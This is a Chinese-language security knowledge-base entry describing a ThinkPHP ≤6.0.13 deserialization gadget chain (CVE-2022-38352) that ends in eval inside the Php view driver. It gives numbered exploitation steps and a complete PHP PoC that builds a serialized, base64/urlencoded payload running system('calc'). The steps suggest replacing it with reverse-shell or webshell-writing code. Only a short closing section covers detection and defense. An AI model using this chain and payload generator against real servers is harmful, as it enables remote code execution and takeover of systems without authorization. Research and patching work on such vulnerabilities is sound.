---
id: web-php-deserialization-thinkphp6-psr6cache-channel-socket-invoke-display-eval
title: ThinkPHP ≤6.0.13 Psr6Cache 链：pool→Channel.__call→record→Socket.save→Container.invoke 把 format_head 可调用数组当模板渲染，Php::display 内 eval 执行（CVE-2022-38352）
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp6-psr6cache-channel-socket-invoke-display-eval
aliases:
- CVE-2022-38352
- Psr6Cache 反序列化
- think\log\Channel __call
- Socket save format_head
- Container invoke invokeMethod
- Php display eval
tags:
- php
- thinkphp
- deserialization
- pop-chain
- flysystem
- invoke
- callable
- eval
- rce
cve:
- CVE-2022-38352
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
affected_versions: thinkphp<=6.0.13
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:38:47+08:00'
  notes: 已对照原文核对：Psr6Cache.__destruct→save→pool->getItem 落到 Channel::__call→log→record→save→Socket::save 的 check/force_client_ids 门→App->invoke(format_head)→Container::invokeMethod→Php::display 的 extract+eval，弹计算器与集成的 eval 断点均与原文图30-43一致；未验证点：原文明言 6.1.0 起移除 filesystem，仅按 ≤6.0.13 标注
---

## 一句话结论

ThinkPHP ≤6.0.13 的 `League\Flysystem\Cached\Storage\Psr6Cache` 在 `__destruct → save()` 里调 `$this->pool->getItem(...)`；把 `pool` 设为 `think\log\Channel` 时，方法不存在会被其 `__call` 接管成 `log() → record() → save()`，`logger` 设为 `think\log\driver\Socket` 后，`format_head` 配置会被 `App::invoke` 当作可调用数组执行 —— 把 `format_head` 设为 `[think\view\driver\Php, 'display']`，`display()` 内的 `eval('?>' . $this->content)` 就执行了 `Request->url()` 拼出的可控字符串，得到 RCE。

## 原理

- **入口**：`AbstractCache::__destruct()` → `if (! $this->autosave) $this->save();`；`Psr6Cache::save()` 依次 `$item = $this->pool->getItem($this->key); $item->set($this->getForStorage()); $this->pool->save($item);`。`pool` 完全可控，`getItem` 不存在时落到 `__call`。
- **`Channel::__call` 把方法名当消息级**：`think\log\Channel::__call($method, $parameters)` 执行 `$this->log($method, ...$parameters);`，于是 `getItem` 变成日志级别名字；`log()` → `record($message,$level,$context)`。`record()` 末尾 `if (! $this->lazy || ! $lazy) { $this->save(); }`，把 `lazy` 设为 `false` 就无条件进入 `Channel::save()`。
- **`Channel::save` 把调用转给 logger**：`if ($this->logger->save($log)) {...}`，`logger` 可控 → 选中 `think\log\driver\Socket::save()`。
- **`Socket::save` 的两个门**：先 `if (! $this->check()) return false;`，`check()` 在 `config['force_client_ids']` 为真且 `allow_client_ids` 为空时返回 true；再 `if ($this->config['debug']) { if ($this->app->exists('request')) { $currentUri = $this->app->request->url(true); } ... }`。把 `app` 设为 `think\App` 并预置 `instances=['think\Request'=>可控 Request]`，`exists('request')` 经 `getAlias()`/`bind` 解析为真，`url(true)` 返回 `domain() . $url`，其中 `$url` 是我们写的 `<?php system('calc'); exit(); ?>`。
- **`invoke` 是最后一个放大器**：`if (!empty($this->config['format_head'])) { $currentUri = $this->app->invoke($this->config['format_head'], [$currentUri]); }`。`Container::invoke` 发现 `$callable` 是数组就走 `invokeMethod`：`[$class,$method]=$method`、`ReflectionMethod`、`bindParams`、`$reflect->invokeArgs(...)`。于是 `format_head = [Php::class,'display']` 等价于调用 `Php::display($currentUri, [])`。
- **`Php::display` 直接 eval**：`$this->content = $content; extract($data, EXTR_OVERWRITE); eval('?>' . $this->content);`。`content` 就是 `http://<?php system('calc'); exit(); ?>`，`?>` 之后的内容被当 PHP 代码执行（`http://` 是普通输出），得到命令执行。
- **为什么 `format_head` 天然是"可调用"**：它是 ThinkPHP 日志的"头部格式化回调"配置，本意接受 `[class, method]` 并加参数调用；任何有 `display(string, array)` 签名的渲染器都能被塞进去，`Php` 驱动恰好把第一个参数当模板内容 eval。
- **版本与组件**：链依赖 `league/flysystem`（`Psr6Cache`）、`think\log\Channel`、`think\log\driver\Socket`、`think\view\driver\Php`、`think\Container::invoke`；原文靶场 6.0.12，影响面 ≤6.0.13。

## 触发条件

- ThinkPHP ≤6.0.13，且上述类均在 classpath（`league/flysystem` 未被移除）。
- 可控 `unserialize` 入口，无 `allowed_classes` 限制。
- `disable_functions` 未影响 `eval`（`eval` 是语言结构，不受 `disable_functions` 限制，但 `system` 需可用；也可换纯 PHP 代码）。
- 目标能从反序列化链拿到可控字符串（`Request->url`）进入 `Php::display` 的 `content`。

## 利用步骤

1. 确认版本与 `league/flysystem` 存在（≤6.0.13）。
2. 构造 payload：`Psr6Cache(pool=Channel(logger=Socket, lazy=false))`；`Socket` 的 `config=['debug'=>true,'force_client_ids'=>1,'allow_client_ids'=>'','format_head'=>[Php::class,'display']]`、`app=App`（`instances=['think\Request'=>Request]`）；`Request` 的 `url='<?php system(\'calc\'); exit(); ?>'`。
3. `serialize` + `base64` + `urlencode` 投递到反序列化点。
4. 观察命令执行结果（原文用弹计算器验证；实际可换成写文件/反弹）。
5. 若 `Php::display` 不可用，改 `format_head` 指向其它 `[class,method]`（如自带 `call_user_func` 风格方法），或把 payload 改成纯 PHP 代码 `<?php file_put_contents('shell.php','...');?>`。

## PoC

```php
<?php
namespace League\Flysystem\Cached\Storage {
    class Psr6Cache {
        private $pool;
        protected $autosave = false;
        public function __construct($exp){ $this->pool = $exp; }
    }
}
namespace think\log {
    class Channel {
        protected $logger; protected $lazy = true;
        public function __construct($exp){ $this->logger = $exp; $this->lazy = false; }
    }
}
namespace think {
    class Request {
        protected $url;
        public function __construct(){ $this->url = '<?php system(\'calc\'); exit(); ?>'; }
    }
    class App {
        protected $instances = [];
        public function __construct(){ $this->instances = ['think\Request'=>new Request()]; }
    }
}
namespace think\view\driver { class Php {} }
namespace think\log\driver {
    class Socket {
        protected $config = []; protected $app;
        public function __construct(){
            $this->config = [
                'debug' => true,
                'force_client_ids' => 1,
                'allow_client_ids' => '',
                'format_head' => [new \think\view\driver\Php, 'display'],
            ];
            $this->app = new \think\App();
        }
    }
}
namespace {
    $c = new think\log\driver\Socket();
    $b = new think\log\Channel($c);
    $a = new League\Flysystem\Cached\Storage\Psr6Cache($b);
    echo urlencode(base64_encode(serialize($a)));
}
```

关键调用链：

```text
Psr6Cache::__destruct → save() → $pool->getItem()
 → think\log\Channel::__call → log() → record() → save()
 → think\log\driver\Socket::save() → check() → $app->invoke($config['format_head'], [$currentUri])
 → Container::invokeMethod → ReflectionMethod(Php,'display')->invokeArgs()
 → think\view\driver\Php::display() → eval('?>' . $content)
```

## 变体与关联

- 变体：`format_head` 换成任意 `[class, method]`（构造器里 `invokeClass` 支持字符串类名），可指向其他带危险方法的类；`$vars` 只有 `[$currentUri]`，目标方法首参必须是字符串。
- 变体：`Request->url` 换成写文件/反弹的 PHP 代码；`$this->content` 中的 `?>` 让前半段 `http://` 变成普通输出，不影响执行。
- 关联：[[web-php-deserialization-thinkphp6-model-destruct-checkallowfields-output-write-webshell]]（同版本区间、同一 `think\` gadget 群，但 sink 是写文件）、[[web-php-deserialization-thinkphp6-flysystem-cachestore-serialize-system-rce]]（同组件的 `system()` 变体）。
- 边界：6.0.14+ 调整/移除 flysystem、`unserialize` 白名单、`Php` 视图驱动移除 `eval`、或 `system` 被禁（仍可用纯 PHP 写文件）时链变化或失效。

## 检测与防御

- 升级到高于 6.0.13 的版本；移除不必要的 `league/flysystem`。
- 不可信输入禁止对象反序列化；必须用时白名单，禁 `League\Flysystem\*`、`think\log\*`、`think\view\driver\Php`。
- 审计日志配置：`format_head` 不应接受运行期可控的类/方法；`Container::invoke` 不应以任意数组作为可调用入口。
- 检测：反序列化参数中出现 `Psr6Cache`、`think\log\Channel`、`format_head`、`think\view\driver\Php`；进程在解析请求后执行 `eval` 相关栈或派生 shell。
